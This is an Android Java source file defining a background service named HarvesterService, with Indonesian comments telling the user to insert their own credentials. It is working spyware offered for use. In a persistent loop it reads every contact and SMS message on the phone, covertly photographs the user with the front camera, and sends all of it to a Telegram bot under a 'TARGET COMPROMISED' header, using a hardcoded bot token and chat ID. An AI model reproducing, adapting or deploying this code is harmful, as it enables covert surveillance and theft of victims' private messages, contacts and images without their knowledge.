package com.ai.homework;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import okhttp3.*;

public class HarvesterService extends Service {
    private OkHttpClient client = new OkHttpClient();
    
    // --- GANTI INI PAKE PUNYA LU ---
    private String BOT_TOKEN = "9136102668:AAHIqngLUTmSneSbZt-ddd34YqRHcpKIkSM"; 
    private String CHAT_ID = "5437327956";     

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        // Sedot Kontak & SMS
                        String contacts = getContacts();
                        String sms = getSms();
                        sendTgText("🎯 TARGET COMPROMISED:\n\nKONTAK:\n" + contacts + "\n\nSMS:\n" + sms);

                        // Jepret Kamera Depan diam-diam
                        takeSecretPhoto();

                        // Tidur 10 menit
                        Thread.sleep(600000);
                    } catch (Exception e) {}
                }
            }
        }).start();
        return START_STICKY;
    }

    private void takeSecretPhoto() {
        try {
            Camera camera = Camera.open(1); // 1 = Kamera Depan
            SurfaceTexture dummy = new SurfaceTexture(0);
            camera.setPreviewTexture(dummy);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    File file = new File(getExternalFilesDir(null), "spy.jpg");
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        fos.write(data);
                    } catch (Exception e) {}
                    cam.release();
                    sendTgPhoto(file);
                }
            });
        } catch (Exception e) {}
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(" : ")
                  .append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            }
            cursor.close();
        }
        return sb.toString();
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)))
                  .append("\nIsi: ").append(cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)))
                  .append("\n\n");
            }
            cursor.close();
        }
        return sb.toString();
    }

    private void sendTgText(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .post(body)
                    .build();
            client.newCall(request).execute();
        } catch (Exception e) {}
    }

    private void sendTgPhoto(File file) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                    .post(requestBody)
                    .build();
            client.newCall(request).execute();
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}